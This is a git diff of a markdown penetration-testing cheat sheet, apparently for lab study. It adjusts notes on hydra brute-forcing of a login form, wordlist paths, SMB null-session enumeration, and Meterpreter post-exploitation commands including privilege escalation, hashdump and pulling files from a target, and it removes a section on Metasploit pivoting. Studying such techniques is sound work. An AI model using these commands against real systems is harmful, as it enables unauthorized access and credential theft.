@@ -32,9 +32,9 @@ hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement f
 
 Add`-f` to stop the brute-forcing after finding one valid cred.
 
-* /etc/john/rockyou.txt for passwords.
-* /usr/share/ncrack/minimal.usr for users.
-* Sometimes you can just use the users list for the passwords too.
+* /usr/share/seclists/Passwords/rockyou-10.txt
+* /usr/share/seclists/Passwords/rockyou-15.txt The above password lists are recommended to run first before the larger rockyou.txt
+* /usr/share/ncrack/minimal.usr for users list.
 
 ## Windows Shares using Null Sessions
 
@@ -62,7 +62,7 @@ smbclient //10.10.10.10/sharename -N
 enum4linux -a 10.10.10.10
 ```
 
-The above command does all the previous ones and gives you more data too except mounting the shares, which you have to implement using smbclient.
+The above command does all the previous ones and gives you more data too except mounting the shares, that you have to implement using smbclient.
 
 ## ARP Poisoning
 
@@ -100,23 +100,10 @@ sessions -i %n
 sysinfo
 ifconfig, route
 getuid
-getsystem #windows privesc
-bypassuac #if windows privesc fails
+getsystem #privesc
+bypassuac #if privesc fails
 hashdump
 cat '/path/to/file.txt'
 download '/path/to/fileontarget.txt' /root/mymachine/
 ```
-
-### Routing in Metasploit
-
-Background the meterpreter of the session where you found the other subnet accessible.
-
-```text
-use post/multi/manage/autoroute
-route add <subnet> <session-id>
-```
-
-You have to input the session id of the meterpreter session.
-
-Now the subnet is accessible in the whole of Metasploit-Framework.
 
